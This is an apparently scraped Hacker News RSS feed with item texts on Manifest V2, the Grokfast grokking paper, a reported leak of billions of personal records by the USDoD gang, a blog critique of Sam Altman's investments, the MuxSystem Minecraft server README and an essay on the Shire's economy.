      <center><a id="up_40570119" href="https://news.ycombinator.com/vote?id=40570119&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>That is great!</p><p>I kind of assumed as much, but unfortunately that also most likely means that it'll lose Manifest V2 support at some point (not that upstream Chrome will keep it).</p><p>That seems to be the concern of some people commenting here, and I wanted to highlight that the two are largely orthogonal as far as I can tell.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40573267"><td></td></tr>
                        <tr id="40571536"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40571536" href="https://news.ycombinator.com/vote?id=40571536&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Google can't take back the source but they can make distribution of binaries hard? Most Windows users are very dependent on pre-built binaries, for example.</p><p>And doesn't Google have leverage over Mozilla by way of their funding?</p></div></td></tr>
        </tbody></table></td></tr>
                        </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Grokfast: Accelerated Grokking by Amplifying Slow Gradients (102 pts)]]></title>
            <link>https://arxiv.org/abs/2405.20233</link>
            <guid>40567165</guid>
            <pubDate>Mon, 03 Jun 2024 20:27:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2405.20233">https://arxiv.org/abs/2405.20233</a>, See on <a href="https://news.ycombinator.com/item?id=40567165">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2405.20233">View PDF</a>
    <a href="https://arxiv.org/html/2405.20233v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>One puzzling artifact in machine learning dubbed grokking is where delayed generalization is achieved tenfolds of iterations after near perfect overfitting to the training data. Focusing on the long delay itself on behalf of machine learning practitioners, our goal is to accelerate generalization of a model under grokking phenomenon. By regarding a series of gradients of a parameter over training iterations as a random signal over time, we can spectrally decompose the parameter trajectories under gradient descent into two components: the fast-varying, overfitting-yielding component and the slow-varying, generalization-inducing component. This analysis allows us to accelerate the grokking phenomenon more than $\times 50$ with only a few lines of code that amplifies the slow-varying components of gradients. The experiments show that our algorithm applies to diverse tasks involving images, languages, and graphs, enabling practical availability of this peculiar artifact of sudden generalization. Our code is available at \url{<a href="https://github.com/ironjr/grokfast" rel="external noopener nofollow">this https URL</a>}.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Jaerin Lee [<a href="https://arxiv.org/show-email/1db31335/2405.20233">view email</a>]      <br>    <strong>[v1]</strong>
        Thu, 30 May 2024 16:35:30 UTC (7,934 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Crooks threaten to leak 3B personal records 'stolen from background check firm' (112 pts)]]></title>
            <link>https://www.theregister.com/2024/06/03/usdod_data_dump/</link>
            <guid>40566938</guid>
            <pubDate>Mon, 03 Jun 2024 20:07:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2024/06/03/usdod_data_dump/">https://www.theregister.com/2024/06/03/usdod_data_dump/</a>, See on <a href="https://news.ycombinator.com/item?id=40566938">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>Billions of records detailing people's personal information may soon be dumped online after being allegedly obtained from a Florida firm that handles background checks and other requests for folks' private info.</p>
<p>A criminal gang that goes by the handle USDoD put the database up for sale for <a target="_blank" rel="nofollow" href="https://x.com/H4ckManac/status/1777246310782902686">$3.5 million</a> on an underworld forum in April, and rather incredibly claimed the trove included 2.9 billion records on all US, Canadian, and British citizens. It's believed one or more miscreants using the handle SXUL was responsible for the alleged exfiltration, who passed it onto USDoD, which is acting as a broker.</p>
<p>The pilfered information is said to include individuals' full names, addresses, and address history going back at least three decades, social security numbers, and people's parents, siblings, and relatives, some of whom have been dead for nearly 20 years. According to USDoD, this info was not scraped from public sources, though there may be duplicate entries for people in the database.</p>

    

<p>Fast forward to this month, and the infosec watchers at VX-Underground say they've not only <a target="_blank" rel="nofollow" href="https://x.com/vxunderground/status/1797047998481854512?s=46">been able to view</a> the database and verify that at least some of its contents are real and accurate, but that USDoD plans to leak the trove. Judging by VX-Underground's assessment, the 277.1GB file contains nearly three billion records on people who've at least lived in the United States – so US citizens as well as, say, Canadians and Brits.</p>

        

<p>This info was allegedly stolen or otherwise obtained from National Public Data, a small information broker based in Coral Springs that offers API lookups to other companies for things like background checks. The biz did not respond to <em>The Register</em>'s inquiries.</p>
<ul>

<li><a href="https://www.theregister.com/2023/09/21/transunion_data_dump/">TransUnion reckons big dump of stolen customer data came from someone else</a></li>

<li><a href="https://www.theregister.com/2023/09/13/airbus_data_leak/">Airbus suffers data leak turbulence to cybercrooks' delight</a></li>

<li><a href="https://www.theregister.com/2024/05/31/snowflake_breach_report/">Snowflake denies miscreants melted its security to steal data from top customers</a></li>

<li><a href="https://www.theregister.com/2024/05/31/cyber_cops_plead_for_info/">Cyber cops plead for info on elusive Emotet mastermind</a></li>
</ul>
<p>There is a small silver lining, according to the VX team: "The database DOES NOT contain information from individuals who use data opt-out services. Every person who used some sort of data opt-out service was not present." So, we guess this is a good lesson in <a target="_blank" rel="nofollow" href="https://www.nationalpublicdata.com/optout.html">opting out</a>.</p>
<p>USDoD is the same crew that previously peddled a 3GB-plus database from <a target="_blank" href="https://www.theregister.com/2023/09/21/transunion_data_dump/">TransUnion</a> containing financial information on 58,505 people.</p>
<p>And last September, the same criminals touted personal information belonging to <a target="_blank" href="https://www.theregister.com/2023/09/13/airbus_data_leak/">3,200 Airbus vendors</a> after the aerospace giant fell victim to an intrusion. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sam Altman, Lately (148 pts)]]></title>
            <link>http://oftheclock.com/sam-altman-lately</link>
            <guid>40566605</guid>
            <pubDate>Mon, 03 Jun 2024 19:33:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://oftheclock.com/sam-altman-lately">http://oftheclock.com/sam-altman-lately</a>, See on <a href="https://news.ycombinator.com/item?id=40566605">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="container">
  <article id="x989J6HzYKrnDLWBoNy8JF">
	<time datetime="2024-06-03">June  3, 2024</time>
  <h2>
    <a href="http://oftheclock.com/sam-altman-lately">Sam Altman, Lately</a>
  </h2>
	<p>A few day ago, YCombinator boss Paul Graham <a href="https://x.com/paulg/status/1796107666265108940">posted an image</a> on X<sup id="fnref1"><a href="#fn1">1</a></sup>, providing an explanation behind Altman’s departure from YCombinator’s main leadership position. Graham’s attempt to dispel rumors of Altman’s supposed firing didn’t work as well as hoped, with many of the responses reiterating that making him choose between OpenAI &amp; YCombinator still constituted a form of firing. However, the more substantial revelation was a few posts later.</p>

<p>While responding to replies, it seems that Graham was <a href="https://x.com/JacquesThibs/status/1796131984688738401">informed</a> — and later <a href="https://x.com/paulg/status/1796174494026879040">confirmed</a> — that Altman had, in a pretty clear conflict of interest and obviously unbeknownst to YCombinator leadership, invested a tidy sum of $10 million into OpenAI’s for-profit arm.</p>

<p>Not a great look.</p>

<p>This morning, the <strong><em>Wall Street Journal</em></strong> went even further with an expose on Altman’s burgeoning business empire, in a piece titled <em><a href="https://www.wsj.com/tech/ai/openai-sam-altman-investments-004fc785?mod=hp_lead_pos7">The Opaque Investment Empire Making OpenAI’s Sam Altman Rich</a></em>. According to the <em><strong>WSJ</strong></em>, Altman has:</p>
<blockquote>
<p>“…a sprawling investment empire that is becoming a direct beneficiary of OpenAI’s success.”</p>
</blockquote>
<p>Supposedly to the tune of about $2.8 billion.</p>

<p>Now, how does that happen when Altman only makes a small salary from OpenAI, and — according to him &amp; the company — doesn’t directly own any of it?</p>

<p>Altman’s personal investments range in everything from nuclear fission reactor start-up Helion to being the third largest public stake in Reddit. Reddit, one of the companies that has a content-sharing deal in place with OpenAI to train ChatGPT. </p>
<blockquote>
<p>“A growing number of Altman’s startups do business with OpenAI itself, either as customers or major business partners. The arrangement puts Altman on both sides of deals, creating a mounting list of potential conflicts in which he could personally benefit from OpenAI’s work.”</p>
</blockquote>
<p>Directly, or indirectly, the streak of intentionally investing in companies that have a conflict of interest doesn’t seem to be declining, either — the exact opposite seems to be true. </p>

<p>Consequences of this dynamic can include placing employees in a real awkward situation, even if according to OpenAI he’s recused himself from some of the deals between the ChatGPT developer and outside companies he’s invested in. Even if he’s not involved in the deals directly, employees now have to consider that their boss is directly affected on each side of a deal, by decisions they could make, is almost sure to have an influence on the outcome. All while they’re supposed to be working for OpenAI’s benefit specifically.</p>

<p>Another article, also issued by the <strong><em>Wall Street Journal</em></strong>, aptly named “<em><a href="https://www.wsj.com/tech/ai/chatgpt-sam-altman-artificial-intelligence-openai-b0e1c8c9?mod=article_inline">The Contradictions of Sam Altman, AI Crusader</a></em>”, touched on some of these issues in March of last year. In it, his investments in Helion ($375mil) &amp; Retro ($180mil) were stated as being “almost all of his liquid wealth.” He was also known to be apart of other projects — including Worldcoin — though the steep growth of his fortune, going from reported between $500-$700 million in March 2023, to $2.8 billion in less than 12 months later is pretty incredible. Especially given his public stance on the financing’s influence on AI’s development.</p>
<blockquote>
<p>“He owns no stake in the ChatGPT developer, saying he doesn’t want the seductions of wealth to corrupt <a href="https://www.wsj.com/tech/ai/chatgpt-sam-altman-artificial-intelligence-openai-b0e1c8c9?mod=article_inline">the safe development of artificial intelligence</a>, and makes a yearly salary of just $65,000.”</p>
</blockquote>
<p>The fact that he’s so clearly financially tied to OpenAI through a diverse set of investments kind of throws the idea that he only takes a $65,000 salary for altruistic reasons directly out of the window. It also lends insight to the leadership dust-up last year.</p>

<p>In November, OpenAI ousted Altman. <a href="https://www.theverge.com/2024/5/28/24166713/openai-helen-toner-explains-why-sam-altman-was-fired">This recent piece</a> by <strong><em>The Verge</em></strong> expounds on the initial reasoning of the board that, at the time, didn’t trust Altman. One of the cited reasons was Altman’s failure to inform the board of his ownership of the OpenAI Startup Fund. Seems like there is a pattern here.</p>

<p>Transparency is probably something Altman would do well to take steps to personally improve, especially after a majority of the board members who pushed out Altman were, as a result of his deal to return, pushed out themselves, resulting in even less oversight. Less critical oversight, at least. Let’s hope — as Altman would put it — for the safety of artificial intelligence, and therefore humanity as whole, transparency does improve across the board. That’s really all we can ask for, given that asking people to <em>actually</em> put financial gain aside as a motivating factor doesn’t seem to historically work out.</p>

<hr>

<p>Any comments, suggestions or corrections can be sent to: <a href="mailto:mail@oftheclock.com">mail@oftheclock.com</a></p>



  <figure id="kudo_x989J6HzYKrnDLWBoNy8JF">
    <a href="#kudo">
      
    </a>
    <p>55</p>
    <p>Kudos</p>
  </figure>
  <figure id="kudo_side_x989J6HzYKrnDLWBoNy8JF">
    <a href="#kudo">
      
    </a>
    <p>55</p>
    <p>Kudos</p>
  </figure>
</article>

</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Oldest largest German Minecraft server shut down and open sourced everything (161 pts)]]></title>
            <link>https://github.com/muxcraftserver/MuxSystem</link>
            <guid>40566533</guid>
            <pubDate>Mon, 03 Jun 2024 19:26:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/muxcraftserver/MuxSystem">https://github.com/muxcraftserver/MuxSystem</a>, See on <a href="https://news.ycombinator.com/item?id=40566533">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">MuxSystem</h2><a id="user-content-muxsystem" aria-label="Permalink: MuxSystem" href="#muxsystem"></a></p>
<p dir="auto"><strong>Das originale MuxCraft System, v10.</strong></p>
<p dir="auto"><em>Alle Server Dateien findest du auf <a href="https://muxcraft.eu/" rel="nofollow">https://muxcraft.eu</a></em></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto"><strong>Shop</strong></p>
<ul dir="auto">
<li>GemShop: Automated Market Maker for users to switch between Coins and Gems. Purchase Items, Ranks &amp; more with Gems.</li>
<li>Shop: Visual Player Shop that works like the stock market. The cheapest offer is shown. Dynamically tracks the cheapest price for each item, updates last known prices, and keeps track of the volume of items sold. Item prices fluctuate based on supply and demand. Earn coins from other players by selling, or buy items. GUI for adding items, updating prices, removing items, and bulk editing features.</li>
<li>Premium Market: User-friendly auction house for items not in the shop.</li>
<li>Mining: Mine ores in the wilderness to earn coins. Inflation-adjusted rewards.</li>
<li>Trading System: Trading GUI to safely trade items, coins between two players. Robust mechanisms and alerts to players to prevent fraud.</li>
</ul>
<p dir="auto"><strong>Bases</strong></p>
<ul dir="auto">
<li>Create &amp; reset bases</li>
<li>Loads &amp; unloads base chunks as needed to optimize performance</li>
<li>Invite friends to base (temporarily or permanently)</li>
<li>Griefing (/grief): Bases become griefable after 72 hours of inactivity (not during whitelist)</li>
<li>Automatic calculation of base value based on block prices in the MuxShop.</li>
<li>Base Ranking (/basen)</li>
<li>Base Spectator/Visiting - /base [name] (Gamemode 3)</li>
<li>Save base as schematic (only with GOLD Rank)</li>
<li>Vote to extend your base daily</li>
<li>Helper NPC</li>
<li>Custom Scoreboards when on own base, visiting or griefing</li>
</ul>
<p dir="auto"><strong>Anti Lag System</strong></p>
<ul dir="auto">
<li>TPS Monitoring</li>
<li>Completely automated anti lag system</li>
<li>Entity &amp; Farms Management: Reduces lags from entities &amp; farms</li>
<li>Item &amp; Drop Management: Prevent lag due to excessive item drops</li>
<li>Prevent Interaction &amp; Packet Spam</li>
<li>Chunk Management &amp; Cleanup</li>
<li>Redstone Optimization</li>
<li>Performance Report (/lag)</li>
<li>Ping Report (/ping)</li>
</ul>
<p dir="auto"><strong>Bot Detection System</strong></p>
<ul dir="auto">
<li>Verification check via simple Book GUI if using VPNs &amp; other suspicious behaviors</li>
<li>Auto Enchanting Checks</li>
<li>Mining Bot Checks</li>
<li>Auto-Detect Chatbots (0% false flags) (Analyzes player chat messages to identify potential spam bots, using pattern recognition and comparison of messages across different players, perma mutes it)</li>
</ul>
<p dir="auto"><strong>Casino</strong></p>
<ul dir="auto">
<li>Realistic Games like Slot Machine, Crash, Scratch Cards, Roulette, CoinFlip, Wheel Of Fortune, Six Fields, Rock Paper Scissors, Item Flip, Guess The Number, Blackjack, Texas Holdem.</li>
<li>Realistic Casino Effects &amp; Decorations</li>
<li>Bank (Switch MuxCoins to Chips and Chips to MuxCoins)</li>
<li>Energy System for players (Replenish with chips)</li>
<li>Special Areas for ULTRA &amp; Gold</li>
<li>Barkeepers, DJs, Security Guards, Play Music</li>
<li>Custom Scoreboard for Casino</li>
</ul>
<p dir="auto"><strong>Events</strong></p>
<ul dir="auto">
<li>Automated Event System</li>
<li>Chat Events, Normal Events &amp; Big Events</li>
<li>AnvilDrop, Arena, BlockParty, Boss, Button, Chamber, Custom, DropSearch, Dropper, EXP, Exit, FastChat, GetDown, GiveAll, Guess, GunWar, Guns, Jump, LastChat, Lotto, Mine, Quiz, Random, Splegg, SurvivalGames, TNT, TNTRun, TempleRun, TopArena, Tournament, Varo, War.</li>
<li>MuxSearch Events for different holiday events (Easter eggs, Candies on Halloween, etc)</li>
<li>Spectate players during Events</li>
<li>Inflation-adjusted rewards</li>
<li>Custom Scoreboard for each Event</li>
</ul>
<p dir="auto"><strong>Extras</strong></p>
<ul dir="auto">
<li>Extras GUI (/extras)</li>
<li>Perks (permanent potion effects)</li>
<li>Realistic Bike (your friend can also mount it)</li>
<li>Animated Emoji Heads</li>
<li>Mounts</li>
<li>Pets</li>
<li>Boosters (Fly Booster, XP Boosters, Spawner Boosters)</li>
<li>Multi Tools</li>
<li>Crates / Chests (Dynamically updated items based on the prices in the MuxShop)</li>
<li>Extra Commands</li>
<li>Expanded Enderchest</li>
<li>Blood Bending (for Mobs only)</li>
</ul>
<p dir="auto"><strong>Holiday Specials</strong></p>
<ul dir="auto">
<li>Christmas Penguins, Halloween Pumpkins, Advent calendar</li>
</ul>
<p dir="auto"><strong>Marketing</strong></p>
<ul dir="auto">
<li>Affiliate System (earn money by inviting players), Cashback for YouTubers</li>
<li>Email System (collect valid emails &amp; answer to support tickets)</li>
<li>Gift Codes (create, delete, use - /giftcode)</li>
<li>Newbie Infos &amp; Rewards</li>
<li>Recurring Tips on how to play</li>
<li>Voting System (Voting required for: Access to Base, Expand Base, Casino, Search Event, Give All, Random, Open Chests, Advent, Menu, Homes, /profile, /repair, /tpa, /tpahere, /tpaccept, Ore Mining, 1vs1, /sell, /trade, Clan Base, Warps (Shop))</li>
</ul>
<p dir="auto"><strong>Main Player Menu</strong></p>
<ul dir="auto">
<li>Dynamic based on your progress and rank</li>
<li>Easy GUI</li>
<li>Settings (blood effect, chat filter, global chat, profile view, support)</li>
<li>Admin Settings (fly, vanish, chatprefix, "focus mode", forcefield)</li>
<li>Team Base Management</li>
</ul>
<p dir="auto"><strong>Misc (MuxSystem):</strong></p>
<ul dir="auto">
<li>Full History (/history), (Coin, Gem, Casino, Command, Death, Teamactions, Teleport, Payment, Support History)</li>
<li>Homes (/home), (GUI, create, view, delete homes, admin management)</li>
<li>Payment System (accept paysafecards ingame)</li>
<li>Warp System (/warp) (create, view, delete, visit warps. Random Teleport)</li>
<li>Shared MySQL Database (Works across multiple servers, updating with netty packets)</li>
<li>Right Click Player Menu (right click player)</li>
<li>Teleport Management (TPA Requests)</li>
<li>Async Player Data Saving, Scheduling Tasks</li>
<li>Cooldown Management</li>
<li>Custom Book GUIs</li>
<li>Current Location in tab list</li>
<li>Clickable, hoverable chat messages</li>
</ul>
<p dir="auto"><strong>MuxTeam</strong></p>
<ul dir="auto">
<li>Server Analytics</li>
<li>Admin Menu (/admin) (set different server settings, see analytics &amp; more)</li>
<li>Punish System (Chat slowdowns, PvP Bans, Auto Perma Mutes for Bots)</li>
<li>ChatFilter (/chatfilter) (GUI, advanced word blacklist system)</li>
<li>Player Overview (/o), (GUI, manage players: resetting stats, managing homes, teleportation, and health management, banning, kicking, and controlling permissions)</li>
<li>Polls (run public or private polls with multiple options &amp; see results)</li>
<li>Report players (/report), Chatreports &amp; Cheatreports, GUI for admins to see reports &amp; act on them</li>
<li>Support System (/support) (Create, manage, close support session. Transfer support to other supporter. Notify/alert system, rotate supports to different supporters so nobody can "snipe" them, save conversation history &amp; response times. Shows FAQ to player before he can ask for support. Ban players from support (24h))</li>
<li>Team Overview (/team) (See a full list of team commands and features)</li>
<li>User Transfer (transfer all user data from one player to another)</li>
<li>Vanish System (hide from players/admins, depending on your rank)</li>
</ul>
<p dir="auto"><strong>PvP</strong></p>
<ul dir="auto">
<li>1vs1 (/1vs1), (Arena System for 1vs1 fights, Random Kits, unranked after 3 days of inactivity, Custom scoreboard)</li>
<li>ClanWars (/cw) (Create fights between clans, dynamic arena system, set entry costs, healing limits, bodyfix/op apples on/off, Custom scoreboards)</li>
<li>Training (/training) (Dynamically creates PvP Bots in the same arena, only shown to player. Custom Bot movement, Pathfinding, visual &amp; sound effects, attributes &amp; behaviors)</li>
<li>PvP Stats, Trophy System (/stats), Leagues</li>
<li>Monthly seasons with winners</li>
</ul>
<p dir="auto"><strong>Ranks</strong></p>
<ul dir="auto">
<li>Custom Permission system</li>
<li>Various User Ranks with Benefits &amp; GUIs</li>
<li>Temporary ranks (GOLD)</li>
<li>VIP, ELITE, EPIC (Diamond in Menu), ULTRA (/ultra), GOLD (/gold), Creator (/creator)</li>
</ul>
<p dir="auto"><strong>Social</strong></p>
<ul dir="auto">
<li>Friendship System (with online alerts)</li>
<li>Clan System: Create, join, manage, and leave clans; clan-specific GUIs for different member ranks; invite members; clan-exclusive chat; clan base; clan rankings and trophies.</li>
<li>Chat System: Advanced Chat Spam Protection: Utilizes intelligent spam detection and character repetition analysis to prevent chat spam. Adaptive Word Blacklisting, IP and Domain Filtering. Staff-only chat.</li>
</ul>
<p dir="auto"><strong>Utilities</strong></p>
<ul dir="auto">
<li>Fake Snow</li>
<li>Scoreboard Manager</li>
<li>NPCs</li>
<li>Player NPCs</li>
<li>Packet Manager</li>
<li>Offline Player Editing</li>
<li>Language</li>
<li>Play Music</li>
<li>Holograms</li>
<li>Giant Items</li>
<li>Fireworks</li>
<li>Old Enchanting, Blood Effects</li>
<li>Chairs</li>
<li>Bossbar</li>
<li>Anvil Input</li>
<li>Duplication Glitch Fixes</li>
<li>Confirm Inventory</li>
<li>Page Inventory Creator</li>
</ul>
<p dir="auto">and much more...</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Bibliotheken</h2><a id="user-content-bibliotheken" aria-label="Permalink: Bibliotheken" href="#bibliotheken"></a></p>
<p dir="auto">Dieses Projekt verwendet eine Reihe von Bibliotheken, die im <code>libs</code> Ordner des Projekts zu finden sind.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Bauen des Plugins</h2><a id="user-content-bauen-des-plugins" aria-label="Permalink: Bauen des Plugins" href="#bauen-des-plugins"></a></p>
<p dir="auto">Das Projekt wird mit dem Artifact-System von IntelliJ gebaut. Hier sind die Schritte, die du befolgen musst:</p>
<ol dir="auto">
<li>Öffne dein Projekt in IntelliJ IDEA.</li>
<li>Navigiere zu <code>File &gt; Project Structure</code>.</li>
<li>Wähle im linken Menü <code>Artifacts</code>.</li>
<li>Klicke auf das Plus-Symbol oben links und wähle <code>JAR &gt; Empty</code>.</li>
<li>Ziehe nun zuerst  <code>xyz compile output</code> in den <code>Output Layout</code> Bereich.</li>
<li>Jetzt machst du rechtsklick auf Client-1.0.2-RELEASE.jar und wählst <code>Extract to Output Root</code>.</li>
<li>Wiederhole Schritt 6 mit Server-1.0.2-RELEASE.jar, Shared-1.0.2-RELEASE.jar, mail-1.5.0.jar, json-20210307.jar, httpclient-4.5.13.jar und httpcore-4.4.13.jar.</li>
<li>Klicke auf <code>OK</code>, um das Artifact zu erstellen.</li>
</ol>
<p dir="auto"><strong>Die Artifakte sollten am Ende ungefähr so aussehen:</strong></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/363fc40d2cc08c31d9dc839c9db673b7f653bbcf331e57019b0b8b86564a9733/68747470733a2f2f692e696d6775722e636f6d2f786f66533376392e706e67"><img src="https://camo.githubusercontent.com/363fc40d2cc08c31d9dc839c9db673b7f653bbcf331e57019b0b8b86564a9733/68747470733a2f2f692e696d6775722e636f6d2f786f66533376392e706e67" alt="Bild" data-canonical-src="https://i.imgur.com/xofS3v9.png"></a></p>
<p dir="auto">Zum Bauen des Plugins klicke auf <code>Build &gt; Build Artifacts</code> und wähle <code>Build</code>. Das Plugin wird nun im <code>out</code> Ordner des Projekts erstellt.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Verwendung des Projekts</h2><a id="user-content-verwendung-des-projekts" aria-label="Permalink: Verwendung des Projekts" href="#verwendung-des-projekts"></a></p>
<p dir="auto">Nach dem Bauen des Projekts musst du die erstellte JAR-File in den <code>plugins</code> Ordner deines Servers hochladen. Zusätzlich musst du den <code>MuxSystem</code> Ordner, der Standarddateien enthält, ebenfalls in den <code>plugins</code> Ordner deines Servers hochladen.</p>
<p dir="auto">Bitte beachte, dass du eventuell die Konfigurationsdateien im <code>MuxSystem</code> Ordner anpassen musst, um das Plugin korrekt auf deinem Server zu konfigurieren.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Einrichtung der MySQL-Verbindung</h2><a id="user-content-einrichtung-der-mysql-verbindung" aria-label="Permalink: Einrichtung der MySQL-Verbindung" href="#einrichtung-der-mysql-verbindung"></a></p>
<p dir="auto">Um eine MySQL-Verbindung für dieses Projekt einzurichten, musst du die <code>config.yml</code> Datei im <code>src/main/java</code> Verzeichnis bearbeiten. Hier sind die Schritte, die du befolgen musst:</p>
<p dir="auto"><strong>Die Shared Datenbank wird verwendet, wenn man mehrere Server hat. Bei nur einem Server können hier die gleichen Daten wie bei der normalen Datenbank eingetragen werden.</strong></p>
<ol dir="auto">
<li>Öffne die <code>config.yml</code> Datei in deinem bevorzugten Texteditor.</li>
<li>Suche nach dem Abschnitt <code>database</code> unter <code>#############&gt;&gt;MYSQL&lt;&lt;#############</code>.</li>
<li>Ändere die Werte <code>username</code>, <code>password</code> und <code>url</code> unter <code>database</code> und <code>shared</code> auf deine MySQL-Datenbankdetails. Zum Beispiel:
<div dir="auto" data-snippet-clipboard-copy-content="database:
    username: deinUsername
    password: deinPasswort
    url: jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&amp;maxReconnects=3
shared:
    username: deinUsername
    password: deinPasswort
    url: jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&amp;maxReconnects=3"><pre><span>database</span>:
    <span>username</span>: <span>deinUsername</span>
    <span>password</span>: <span>deinPasswort</span>
    <span>url</span>: <span>jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&amp;maxReconnects=3</span>
<span>shared</span>:
    <span>username</span>: <span>deinUsername</span>
    <span>password</span>: <span>deinPasswort</span>
    <span>url</span>: <span>jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&amp;maxReconnects=3</span></pre></div>
</li>
<li>Speichere die Änderungen und schließe die Datei.</li>
</ol>
<p dir="auto">Jetzt ist dein Projekt so konfiguriert, dass es eine Verbindung zu deiner MySQL-Datenbank herstellt, wenn es ausgeführt wird.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Moral Economy of the Shire (170 pts)]]></title>
            <link>https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/</link>
            <guid>40566142</guid>
            <pubDate>Mon, 03 Jun 2024 18:57:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/">https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/</a>, See on <a href="https://news.ycombinator.com/item?id=40566142">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div>
<figure><img data-attachment-id="11862" data-permalink="https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7/" data-orig-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7.jpg" data-orig-size="2592,1936" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 4&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1415283840&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.85&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0048780487804878&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;,&quot;latitude&quot;:&quot;-37.857577777778&quot;,&quot;longitude&quot;:&quot;175.67994722222&quot;}" data-image-title="hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7" data-image-description="" data-image-caption="" data-medium-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7.jpg?w=300" data-large-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7.jpg?w=676" width="1024" height="764" src="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/hobbiton_the_shires_middle-earth_matamata_new_zealand_-_panoramio_7.jpg?w=1024" alt=""><figcaption><sub>Who paid for this?</sub></figcaption></figure></div>


<p>There’s a <a href="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/421269919_698304545721558_2085131120823179231_n.jpg" target="_blank" rel="noreferrer noopener">certain meme</a> that I see making the rounds on Facebook every so often about the bucolic nature of life in the Shire, from Tolkien’s <em>The Hobbit</em> and <em>The Lord of the Rings</em>, and because I am the way that I am, every time I see it, it makes me start thinking. “<em>Are </em>there taxes in the Shire? If not, how does the government function? <em>Are </em>there worries? Does the lack of taxes relate to the lack of worries? How do people think a whole economic system built around drinking and pipe-smoking even works?” Luckily, I think there are answers to this. Tolkien does not describe the political economy of the Hobbits in any detail, because it’s rarely relevant to the story, but I think we can learn a lot about it from what he does mention. In Tolkien’s legendarium, the Shire is built out an idealized version of rural English society. By looking at how he depicts this–and what eventually happens to it–we can learn a lot about how these sorts of societies function and change over time, and what the benefits and drawbacks of living life Hobbit-style <em>really </em>are.</p>



<p>We’ll begin with a quick sketch of the Shire’s government. This won’t take long, because there’s not much of it. We’re told explicitly, right at the start of <em>Lord of the Rings</em>: </p>



<blockquote>
<p>The Shire at this time had hardly any ‘government’. Families for the most part managed their own affairs. Growing food and eating it occupied most of their time. In other matters they were, as a rule, generous and not greedy, but contented and moderate, so that estates, farms, workshops, and small trades tended to remain unchanged for generations.</p>
<cite>The Fellowship of the Ring, J.R.R. Tolkien, pg. 9</cite></blockquote>



<p>Legally speaking, the Shire took the form of a royal grant from King Argeleb II to the brothers Marcho and Blanco in 1601 TA, granting their people the right to settle the lands between the Brandywine River and the Far Downs, in return for which they were to maintain the bridges and roads, aid the King’s couriers, and acknowledge him as liege-lord. After the downfall of the Kingdom of Arnor, the Hobbits chose to maintain this legal continuity by establishing the office of Thain, a hereditary chieftainship who could take the place of the absent monarch. This office originally belonged to the Oldbuck family, but some centuries prior to the events of <em>Lord of the Rings</em> had passed to the Tooks. The Thain was the nominal Head of State for the Shire, and had the authority to summon the moot and muster in times of emergency, but this was mostly ceremonial, given the lack of emergencies. </p>



